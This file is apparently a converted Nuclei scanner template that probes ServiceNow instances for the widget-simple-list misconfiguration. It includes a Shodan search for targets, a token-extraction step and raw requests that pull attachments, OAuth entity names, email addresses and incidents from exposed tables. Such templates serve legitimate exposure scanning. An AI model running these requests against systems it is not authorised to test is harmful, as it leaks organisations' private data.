@@ -1,0 +1,218 @@
+{
+  "id": "servicenow-widget-misconfig",
+  "name": "ServiceNow Widget-Simple-List - Misconfiguration",
+  "author": "DhiyaneshDk",
+  "severity": "UNKNOWN",
+  "description": "",
+  "references": [
+    "https://github.com/bsysop/servicenow",
+    "https://twitter.com/ConspiracyProof/status/1713270026046685272",
+    "https://www.enumerated.ie/servicenow-data-exposure"
+  ],
+  "tags": [
+    "servicenow",
+    "widget",
+    "misconfig"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "title:\"servicenow\""
+  },
+  "variables": {
+    "table_list": [
+      "t\u003dkb_knowledge\u0026f\u003dtext",
+      "t\u003dcmdb_model\u0026f\u003dname",
+      "t\u003dcmn_department\u0026f\u003dapp_name",
+      "t\u003dlicensable_app\u0026f\u003dapp_name",
+      "t\u003dalm_asset\u0026f\u003ddisplay_name",
+      "t\u003dsys_attachment\u0026f\u003dfile_name",
+      "t\u003dsys_attachment_doc\u0026f\u003ddata",
+      "t\u003doauth_entity\u0026f\u003dname",
+      "t\u003dcmn_cost_center\u0026f\u003dname",
+      "t\u003dcmdb_model\u0026f\u003dname",
+      "t\u003dsc_cat_item\u0026f\u003dname",
+      "t\u003dsn_admin_center_application\u0026f-name",
+      "t\u003dcmn_company\u0026f\u003dname",
+      "t\u003dsys_email_attachment\u0026f\u003demail",
+      "t\u003dsys_email_attachment\u0026f\u003dattachment",
+      "t\u003dcmn_notif_device\u0026f\u003demail_address",
+      "t\u003dsys_portal_age\u0026f\u003ddisplay_name",
+      "t\u003dincident\u0026f\u003dshort_description"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "@once\nGET / HTTP/1.1\nHost: {{Hostname}}\n",
+        "@once\nGET /login.do HTTP/1.1\nHost: {{Hostname}}\n",
+        "POST /api/now/sp/widget/widget-simple-list?{{table_list}} HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nX-UserToken: {{user-token}}\nContent-Type: application/json\n\n{}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\"isValid\":true",
+            "\"count\":"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "\"display_value\":\"(.*)\","
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "servicenow-widget-misconfig",
+    "info": {
+      "name": "ServiceNow Widget-Simple-List - Misconfiguration",
+      "author": "DhiyaneshDk",
+      "severity": "unknown",
+      "reference": [
+        "https://github.com/bsysop/servicenow",
+        "https://twitter.com/ConspiracyProof/status/1713270026046685272",
+        "https://www.enumerated.ie/servicenow-data-exposure"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 54,
+        "shodan_query": "title:\"servicenow\""
+      },
+      "tags": "servicenow,widget,misconfig"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "table_list": [
+            "t\u003dkb_knowledge\u0026f\u003dtext",
+            "t\u003dcmdb_model\u0026f\u003dname",
+            "t\u003dcmn_department\u0026f\u003dapp_name",
+            "t\u003dlicensable_app\u0026f\u003dapp_name",
+            "t\u003dalm_asset\u0026f\u003ddisplay_name",
+            "t\u003dsys_attachment\u0026f\u003dfile_name",
+            "t\u003dsys_attachment_doc\u0026f\u003ddata",
+            "t\u003doauth_entity\u0026f\u003dname",
+            "t\u003dcmn_cost_center\u0026f\u003dname",
+            "t\u003dcmdb_model\u0026f\u003dname",
+            "t\u003dsc_cat_item\u0026f\u003dname",
+            "t\u003dsn_admin_center_application\u0026f-name",
+            "t\u003dcmn_company\u0026f\u003dname",
+            "t\u003dsys_email_attachment\u0026f\u003demail",
+            "t\u003dsys_email_attachment\u0026f\u003dattachment",
+            "t\u003dcmn_notif_device\u0026f\u003demail_address",
+            "t\u003dsys_portal_age\u0026f\u003ddisplay_name",
+            "t\u003dincident\u0026f\u003dshort_description"
+          ]
+        },
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "@once\nGET / HTTP/1.1\nHost: {{Hostname}}\n",
+          "@once\nGET /login.do HTTP/1.1\nHost: {{Hostname}}\n",
+          "POST /api/now/sp/widget/widget-simple-list?{{table_list}} HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nX-UserToken: {{user-token}}\nContent-Type: application/json\n\n{}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\"isValid\":true",
+              "\"count\":"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "\"display_value\":\"(.*)\","
+            ],
+            "group": 1,
+            "internal": true
+          }
+        ],
+        "extractors": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "var g_ck \u003d \u0027([0-9a-z]+)\u0027"
+            ],
+            "group": 1,
+            "name": "user-token",
+            "internal": true
+          },
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "\"count\":([0-9]+),"
+            ],
+            "group": 1,
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
